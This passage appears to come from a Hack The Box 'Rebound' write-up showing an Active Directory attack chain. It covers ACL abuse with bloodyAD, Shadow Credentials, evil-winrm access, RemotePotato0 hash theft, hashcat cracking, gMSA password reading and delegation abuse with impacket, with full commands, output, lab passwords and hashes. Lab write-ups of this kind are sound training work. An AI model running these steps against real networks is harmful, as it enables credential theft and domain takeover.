  File "/usr/lib/python3/dist-packages/bloodhound/ad/utils.py", line 362, in get_entry_property
    value = entry['attributes'][prop]
            ~~~~~^^^^^^^^^^^^^^
TypeError: 'NoneType' object is not subscriptable
```

Upon reviewing the error messages, it appears that BloodHound was failing to collect object properties, which caused the initial attempt to fail. To address this, I reattempted the process, this time excluding the `objectprops` from the collection methods. This adjustment resolved the issue, allowing the collection to proceed successfully.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ bloodhound-python -d REBOUND.HTB -ns 10.129.229.114 -k -u ldap_monitor -p '1GR8t@$$4u' -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn --zip 
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: User with SID S-1-5-21-4078382237-1492182817-2568127209-7686 is logged in on dc01.rebound.htb
INFO: Done in 00M 33S
INFO: Compressing output into 20241219165359_bloodhound.zip
```

### BloodHound Analysis

Through the BloodHound analysis, several key findings were identified:

- The account **`OOREND`** has the **`AddSelf`** permission on the **`SERVICEMGMT`** security group, which allows it to add itself as a member of the group.
- Members of the **`SERVICEMGMT`** group are granted **`GenericAll`** (Full Control) permissions on the **`SERVICE USERS`** Organizational Unit (OU).
- The account **`WINRM_SVC`** is located within the **`SERVICE USERS`** OU.
- The **`WINRM_SVC`** account has **`PSRemote`** permissions on the target, potentially providing remote PowerShell access.

![Bloodhound Analysis](/assets/img/htb/rebound/bloodhound-mapping-1.png)

Given these findings, adding **`OOREND`** to the **`SERVICEMGMT`** group seems to be the most promising path for gaining a foothold on the target server.


## Foothold

The first step is to add **`OOREND`** as a member of the **`SERVICEMGMT`** security group. To achieve this, I can use either **`bloodyAD`** or **`powerview.py`**. I prefer using **`bloodyAD`** for these types of actions due to its simplicity and efficiency.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ bloodyAD -d rebound.htb --dc-ip 10.129.229.114 -u OOREND -p '1GR8t@$$4u' add groupMember SERVICEMGMT OOREND
[+] OOREND added to SERVICEMGMT

Alternatively, the same task could be accomplished using PowerView.

```shell
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Add-DomainGroupMember -Identity SERVICEMGMT -Members oorend
[2024-12-19 19:37:58] User oorend successfully added to SERVICEMGMT
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-DomainGroupMember -Identity SERVICEMGMT                
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : fflock
MemberDistinguishedName     : CN=fflock,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682

```

But looks like there is some batch job running on the target and it keeps updating the group membership:

```shell
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-DomainGroupMember -Identity SERVICEMGMT
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : fflock
MemberDistinguishedName     : CN=fflock,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382
```

So, instead of depending on the group membership, I granted `OOREND` `Generic All` permissions directly.

```shell
──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ bloodyAD -d rebound.htb --dc-ip 10.129.229.114 -u OOREND -p '1GR8t@$$4u' add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```


## Gaining Foothold Using Shadow Credentials

While it would be straightforward to change the password for the **`WINRM_SVC`** account and use it to gain a session on the target, this approach would be highly detectable in a real-world scenario. Service accounts, such as **`WINRM_SVC`**, are typically well-monitored, and changing their passwords could trigger alerts. 

Additionally, because service accounts are used to run critical services, a password change would likely cause these services to fail, which could immediately notify administrators of suspicious activity.

Instead of taking this obvious approach, we will employ a more stealthy technique called **`Shadow Credentials`**. This method allows us to bypass password changes and maintain persistence without triggering alarms.

For a detailed explanation of **Shadow Credentials** and how it works, refer to this [article by Elad Shamir](https://eladshamir.com/2021/06/21/Shadow-Credentials.html).


For this we can either use `pywhisker` which cane be cloned from [ShutdownRepo GitHub repository](https://github.com/ShutdownRepo/pywhisker) or simpler option `certipy-ad`.

First, I checked if the `msDS-KeyCredentialLink` attribute is populated for `winrm_svc` using the `list` arguement.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ certipy-ad shadow list -account winrm_svc -target dc01.rebound.htb -dc-ip 10.129.229.114 -u oorend@REBOUND.HTB -p '1GR8t@$$4u' -k -debug                      
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.rebound.htb' at '10.129.229.114'
[+] Authenticating to LDAP server
[+] Getting TGT for 'OOREND@REBOUND.HTB'
[+] Got TGT for 'OOREND@REBOUND.HTB'
[+] Getting TGS for 'host/dc01.rebound.htb'
[+] Got TGS for 'host/dc01.rebound.htb'
[+] Bound to ldaps://10.129.229.114:636 - ssl
[+] Default path: DC=rebound,DC=htb
[+] Configuration path: CN=Configuration,DC=rebound,DC=htb
[*] Targeting user 'winrm_svc'
[*] The Key Credentials attribute for 'winrm_svc' is either empty or the current user does not have read permissions for the attribute
```

Then to add the attribute, I am going to use the `add` arguement.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ certipy-ad shadow auto -account winrm_svc -target dc01.rebound.htb -dc-ip 10.129.229.114 -u oorend@REBOUND.HTB -p '1GR8t@$$4u' -k -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.rebound.htb' at '10.129.229.114'
[+] Authenticating to LDAP server
[+] Getting TGT for 'OOREND@REBOUND.HTB'
[+] Got TGT for 'OOREND@REBOUND.HTB'
[+] Getting TGS for 'host/dc01.rebound.htb'
[+] Got TGS for 'host/dc01.rebound.htb'
[+] Bound to ldaps://10.129.229.114:636 - ssl
[+] Default path: DC=rebound,DC=htb
[+] Configuration path: CN=Configuration,DC=rebound,DC=htb
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fd8da56c-802c-e8da-978a-bda7e701b198'
<KeyCredential structure at 0x7f4dc84d6300>
  | Owner: CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
  | Version: 0x200
  | KeyID: H6M9L3/61WdbprAxLIhJEbnVfL2LRKN9llPQDgFfQOc=
  | KeyHash: cc0b3f38ab5b1cfd677ffdeb7b8b2fe6669619f8cad665df6fa90ceb44367146
  | RawKeyMaterial: <dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7f4dc84d62a0>
  |  | Exponent (E): 65537
  |  | Modulus (N): 0xa2bb2b5e803b5611a20b02768487887a01e697abbc84a127071ba65515ee26d755e414fd80c593fa476afb0cc55b25c67c7e9af848d5cfdd013422fb19527baddb3e521d33116812352b1d93f36eb2e3316f6853d2d5ea13ff7315c573076814a34feb1629054a13c06408c5da4bddc6b09bbd25a9fbdd03805c8f7522ad318a3a907b331287b0edecead77260dddc00ec0ca62d7fbf70dc12629b9c22ebdc03b9db781a4a85d00dd2da45b1e76599a72df29ed91e9563c7136d861198a16d306933a46aec6d91247ccddd0d90790ddbb54fe57337889fc89d76aa1ca6e882f7ce68d2ffd0520b514be076d0177c934b9d3fd763887191ed342e4ee16368028d
  |  | Prime1 (P): 0x0
  |  | Prime2 (Q): 0x0
  | Usage: KeyUsage.NGC
  | LegacyUsage: None
  | Source: KeySource.AD
  | DeviceId: fd8da56c-802c-e8da-978a-bda7e701b198
  | CustomKeyInfo: <CustomKeyInformation at 0x7f4dc84a7e30>
  |  | Version: 1
  |  | Flags: KeyFlags.NONE
  |  | VolumeType: None
  |  | SupportsNotification: None
  |  | FekKeyVersion: None
  |  | Strength: None
  |  | Reserved: None
  |  | EncodedExtendedCKI: None
  | LastLogonTime (UTC): 2024-12-20 00:33:55.230013
  | CreationTime (UTC): 2024-12-20 00:33:55.230013
[+] Key Credential: B:828:000200002000011fa33d2f7ffad5675ba6b0312c884911b9d57cbd8b44a37d9653d00e015f40e7200002cc0b3f38ab5b1cfd677ffdeb7b8b2fe6669619f8cad665df6fa90ceb443671461b0103525341310008000003000000000100000000000000000000010001a2bb2b5e803b5611a20b02768487887a01e697abbc84a127071ba65515ee26d755e414fd80c593fa476afb0cc55b25c67c7e9af848d5cfdd013422fb19527baddb3e521d33116812352b1d93f36eb2e3316f6853d2d5ea13ff7315c573076814a34feb1629054a13c06408c5da4bddc6b09bbd25a9fbdd03805c8f7522ad318a3a907b331287b0edecead77260dddc00ec0ca62d7fbf70dc12629b9c22ebdc03b9db781a4a85d00dd2da45b1e76599a72df29ed91e9563c7136d861198a16d306933a46aec6d91247ccddd0d90790ddbb54fe57337889fc89d76aa1ca6e882f7ce68d2ffd0520b514be076d0177c934b9d3fd763887191ed342e4ee16368028d01000401010005001000066ca58dfd2c80dae8978abda7e701b198020007010008000867b4dcd97652db0108000967b4dcd97652db01:CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
[*] Adding Key Credential with device ID 'fd8da56c-802c-e8da-978a-bda7e701b198' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'fd8da56c-802c-e8da-978a-bda7e701b198' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

I was able to get the NT hash for `winrm_svc` successfully: `4469650fd892e98933b4536d2e86e512`

## Evil-WinRM

I am now going to PS Remote into the tatget using `evil-winrm`. 

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

> User flag can be found at `C:\Users\winrm_svc\Desktop\user.txt`
{: .prompt-info}

If we look at `C:\Users`, we see a folder for `tbrady`, but this user is nether and administrator, nor does he have PS Remove privileges. So, it is weird how he even got access to this server. Maybe he had access in the past and that folder is from that time?

```shell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/28/2023   8:23 PM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----        8/22/2023  12:05 PM                tbrady
d-----         4/8/2023   2:08 AM                winrm_svc
```

When looking at the running processes, we see explorer is running too which is weird. Is somebody actually logged in?

``user` command did not show any active user or disconnected user on the server:

```shell
*Evil-WinRM* PS C:\> quser
quser.exe : No User exists for *
    + CategoryInfo          : NotSpecified: (No User exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

But why? Why are we unable to see an active or disconnected session when `explorer` is running? Maybe `evil-winrm` is unable to query the session. 

Google! Google! Google!.......

```shell
*Evil-WinRM* PS C:\ProgramData> upload RunasCs.exe
                                        
Info: Uploading /home/kali/hack-the-box/rebound/RunasCs.exe to C:\ProgramData\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\ProgramData> 
```

Now, we are able to find an active session for `tbrady`:

```shell
*Evil-WinRM* PS C:\ProgramData> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

Now we are going to try to get the hashes for this user from his session.

```shell
*Evil-WinRM* PS C:\ProgramData> upload RemotePotato0.exe
                                        
Info: Uploading /home/kali/hack-the-box/rebound/RemotePotato0.exe to C:\ProgramData\RemotePotato0.exe
                                        
Data: 235520 bytes of 235520 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\ProgramData>
```


```shell
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.229.114:9999
```

On the target:

```shell
*Evil-WinRM* PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.104 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client	: DC01
NTLMv2 Username	: rebound\tbrady
NTLMv2 Hash	: tbrady::rebound:85e9596881c98920:4ba2f291b8e6405839f775486cad293f:0101000000000000e8a6bdad8052db010aa279dcc39b77d20000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800e8a6bdad8052db0106000400060000000800300030000000000000000100000000200000033f5443775263405914ae53c941949d7a83c2167fb184e0b83d29f81ca4ab0f0a00100000000000000000000000000000000000090000000000000000000000
```

I saved tbe `NTLMv2` hash in a `txt` file and then cracked it offline using `hashcat`.

```shell
hashcat -m 5600 -a 0 -o tbrady.password tbrady.ntlmv2hash /usr/share/wordlists/rockyou.txt
```

`tbrady:543BOMBOMBUNmanda`

Since we already know that `tbrady` has readgmsapassword permissions on `delegator$`, let's abuse that.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ bloodyAD -d rebound.htb --dc-ip 10.129.229.114 -u tbrady -p '543BOMBOMBUNmanda' get object 'DELEGATOR$' --attr 'msDS-ManagedPassword'

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4ba33add1108fe560429fc27a1bcab6b
msDS-ManagedPassword.B64ENCODED: NikXxFjQpBQrJqGAoSwQfOJIcS4wKNsur+HWUgv8o4fs6tlKg8aqiw1hINqtW2YwYl8Z1aO6AMsosv4kx81YKfH7AuhmB+vzCKB4VyXKmtEx390JWrBXHcNKcxlygf8Urs3g+RNlodOEx0FDGsoFRZ1Lq1nJetOTSLVY/sVm4q/jHbWxsmCsXenE6XK5a8z5q3yD6Mx4Ho3CdnVB110Ac24SxV1t+tKPsZ1Q1bbhhF7bf37jTiz9v6hsSZVNWgmxfDPg02n1oaViqh+XRdZnLtEs6i5O3HiAEtWYJdjEm0Qc2DCSupQRA5HSeZ51mEauBRRHyUhIjZeAuGckCFyYew==
```

I could have done the same thing with `netexec` if I wanted to.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec ldap 10.129.229.114 -d rebound.htb -k -u tbrady -p '543BOMBOMBUNmanda' --gmsa
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.229.114  636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAPS       10.129.229.114  636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.229.114  636    DC01             Account: delegator$           NTLM: 4ba33add1108fe560429fc27a1bcab6b
```

> It is not a good idea to grant a user account read password permissions on gmsa password.
{: .prompt-warning}

```shell
PV > Get-DomainObject -Identity 'delegator$' -Select servicePrincipalName,msDS-GroupMSAMembership 
servicePrincipalName        : browser/dc01.rebound.htb
msDS-GroupMSAMembership     : S-1-5-21-4078382237-1492182817-2568127209-7686
```

I can do the same thing using `impacket-findDelegation`.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-findDelegation 'rebound.htb/delegator$' -dc-ip 10.129.229.114 -k -hashes :4ba33add1108fe560429fc27a1bcab6b
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists 
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No         
```


```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-getST -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :4ba33add1108fe560429fc27a1bcab6b
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
```


RBCD

```shell
                                                                                                                                       
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-rbcd 'rebound.htb/delegator$' -hashes :4ba33add1108fe560429fc27a1bcab6b -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
/usr/share/doc/python3-impacket/examples/rbcd.py:145: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

Checking the delegation again:

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-findDelegation 'rebound.htb/delegator$' -dc-ip 10.129.229.114 -k -hashes :4ba33add1108fe560429fc27a1bcab6b
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists 
------------  -----------------------------------  --------------------------  ---------------------  ----------
ldap_monitor  Person                               Resource-Based Constrained  delegator$             No         
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No         
```

```shell
 getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$

 ```

 ```shell
 ┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user ldap_monitor or initial TGT not forwardable
```

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ powerview rebound/oorend:'1GR8t@$$4u'@dc01.rebound.htb  --use-channel-binding
Logging directory is set to /home/kali/.powerview/logs/rebound-oorend-dc01.rebound.htb
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-DomainObject -Identity Administrator
objectClass                : top
                             person
                             organizationalPerson
                             user
cn                         : Administrator
description                : Built-in account for administering the computer/domain
distinguishedName          : CN=Administrator,CN=Users,DC=rebound,DC=htb
instanceType               : 4
whenCreated                : 07/04/2023 14:01:41 (1 year, 8 months ago)
whenChanged                : 19/12/2024 14:33:51 (today)
uSNCreated                 : 8196
memberOf                   : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb
                             CN=Domain Admins,CN=Users,DC=rebound,DC=htb
                             CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb
                             CN=Schema Admins,CN=Users,DC=rebound,DC=htb
                             CN=Administrators,CN=Builtin,DC=rebound,DC=htb
uSNChanged                 : 176178
name                       : Administrator
objectGUID                 : {37857665-6e2e-4f12-9976-5c9babcd8282}
userAccountControl         : NORMAL_ACCOUNT [1114624]
                             DONT_EXPIRE_PASSWORD
                             NOT_DELEGATED
```

I am going to target DC01

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate 'DC01$'      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-describeTicket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache                             
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 18cc599a53bad960b2bb32f94d4ac70f
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 20/12/2024 08:28:27 AM
[*] End Time                      : 20/12/2024 18:28:26 PM
[*] RenewTill                     : 21/12/2024 08:28:01 AM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : GMxZmlO62WCyuzL5TUrHDw==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$e40eb47e7223e30cb28a6014$3fe0cb9eda5d885b27b395e29be26c128b184082e10decd2995fe96c82dfffa8e8d0ef0d9550336399b7682f1e788da3d28096d05a80fa4c00a36d008a0e26798d973127377be8de1eeaf9b1b9576f3b77defb8b13f38d7c5d77c73951dff2f6759513d983a0191f0db424db00c95842f1c9098318c32824fe8e2789ff1488c3b43acac9c10d13d541fa6506703b1abc30463d1ad4da3b7cde7806b8c8dba8d287a94e0439196583be0a60b606350fb84c8e9a599b020044bbb2e13d344e7b038c34144ed831c40b5a78612951e43f096086d9da5139b8a2160165e1b953cf62e823ccf2cee7d8381813e466ab51d931469ee371931b6d3e3e6c18e0c9e2baa6716bf1f59d8d9223ad5917880e3f8be937f4559f0392dbb5531356143e49b6e9adbefdc49c683719ad73556d49cff1a34a170f80fe64378a5e21a9e1bcfc5105a2bb1ff402478334905ca93e70a07fd3fad91270f2b928f004ccca0dfa199e1126819f1c1faf28bfb58e54cfc4ff040430db98f318fa958ac8f328cf294ae1df7a2cc85f7d577ada11301e17da88dfad1617ff878c6a0d24ede872c8bdaf00a31f735b89d101c7e59a954f5deebb97662f3a5a0791e649303abc318c49a99172f92ea0493536b4673b41853439dbbe2a54fc9873e66295cdc62cb0b03cb1c9777a1ce4c8ffabb74cd5788dbca4edc21d069f6a87cc9ea7aa9f224720cd645847265effeb8a4f1d9b347a4996911ee3e4fd51832d9dc4a13c62bfa8521e1a194fb0e26a0b001801110264d63d23e90d0dd8e1a8bda770dab294adfdbf5e01c04046fc3e4ea37a5fb0d69ea960df34a7e56eb0f18201a2be832635bea578461be4960e6efa02aa6ee2217fbafa3cbd8619bf88615cb0856c07a8e662559c0e35ae9f2fdac1e70b7dc3db335864f55eb8897ce22b2bb5782e5d6d7be601824653e91e58c96372a7e50d80b378fbca9d0ce0ccc507bbaf314d4c439d9e8e3e99d6c964ddbe8dd8492903fa00e79453bde229ce952a384822c171e0dfed3f04749e346344520d3ae185b60da97a964af3c92957e80df55d433baef271050e4e5f7cb37aced809e6b49fc55ef78e5f01220ba57e6d43f8b1ef495d8dafc5640c89e493ae2a2682eb53e9127915748ac6aed9f60d79fd601840b77e067786ed791c4a6b337eea5e05650967bde7f4ac2e3727b3f0f5f4edcfdd6a2c1c14c655323417972dd5fafa81fa26